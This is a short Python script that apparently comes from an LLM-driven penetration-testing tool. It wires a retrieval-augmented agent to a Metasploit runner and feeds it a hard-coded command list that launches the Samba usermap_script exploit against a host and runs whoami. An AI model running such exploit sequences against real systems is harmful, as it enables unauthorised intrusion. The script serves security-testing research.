from Tools_attach import CyberTools
from pentestgpt.utils.APIs.module_import import dynamic_import
from pentestgpt.prompts.prompt_class import PentestGPTPrompt
from rag import Rag_module

CyberTools = CyberTools()

log_dir = 'logs'
reasoning_model="gpt-4-1106-preview"
use_langfuse_logging=False
datapath = "./resources/knowledgebase_extra/"
vectorPath = './resources/vectorbase/'

command_extract_model_object = dynamic_import(
            reasoning_model, log_dir, use_langfuse_logging=use_langfuse_logging
        )

RagModule = Rag_module(datapath)
generatorAgent = RagModule.rag_init(vectorPath , apiKey = 'sk-*************')
commandExtractor = command_extract_model_object

(text_3,command_extractor_session_id,) = commandExtractor.send_new_message(PentestGPTPrompt.command_extractor_init)


commands = [
    'msfconsole',
    'use exploit/multi/samba/usermap_script',
    'search samba',
    'set RHOSTS ...226',
    'set LHOST ...163',
    'run',
    'whoami'
]

results = CyberTools.run_metasploit_commands_search_itt(commands, generatorAgent , commandExtractor, PentestGPTPrompt.msf_comm_extract, command_extractor_session_id)
print(results)
